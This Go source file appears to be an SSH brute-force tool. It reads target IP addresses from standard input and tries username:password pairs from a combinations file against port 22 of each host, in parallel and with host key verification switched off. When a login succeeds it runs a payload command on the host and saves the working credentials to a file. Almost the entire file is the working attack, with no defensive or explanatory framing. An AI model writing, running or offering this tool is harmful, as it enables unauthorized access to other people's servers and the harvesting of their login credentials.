package main

import (
    "bufio"
    "fmt"
    "golang.org/x/crypto/ssh"
    "log"
    "os"
    "strings"
    "sync"
)

var payload = "uname"

func bruteForceSSH(ip string, username string, password string) bool {
    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         30,
    }

    conn, err := ssh.Dial("tcp", ip+":22", config)
    if err == nil {
        defer conn.Close()
        fmt.Printf("Successfully logged in to %s with username %s and password %s\n", ip, username, password)

        session, err := conn.NewSession()
        if err == nil {
            defer session.Close()
            session.Run(payload)
            return true
        }
        //fmt.Println(err)
    }
    //fmt.Println(err)
    //fmt.Printf("Failed %s %s %s\n", ip, username, password)
    return false
}

func main() {
    var wg sync.WaitGroup
    scanner := bufio.NewScanner(os.Stdin)

    for scanner.Scan() {
        ip := strings.TrimSpace(scanner.Text())

        wg.Add(1)
        go func(ip string) {
            defer wg.Done()
            file, err := os.Open("combinations.txt")
            if err != nil {
                log.Fatal(err)
            }
            defer file.Close()

            scanner := bufio.NewScanner(file)
            for scanner.Scan() {
                combination := strings.Split(scanner.Text(), ":")
                username := combination[0]
                password := combination[1]

                if bruteForceSSH(ip, username, password) {
                    f, err := os.OpenFile("valid_ssh.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
                    if err != nil {
                        log.Fatal(err)
                    }
                    defer f.Close()

                    if _, err := fmt.Fprintf(f, "%s:22 %s:%s\n", ip, username, password); err != nil {
                        log.Fatal(err)
                    }
                    break
                }
            }
        }(ip)
    }

    wg.Wait()
}
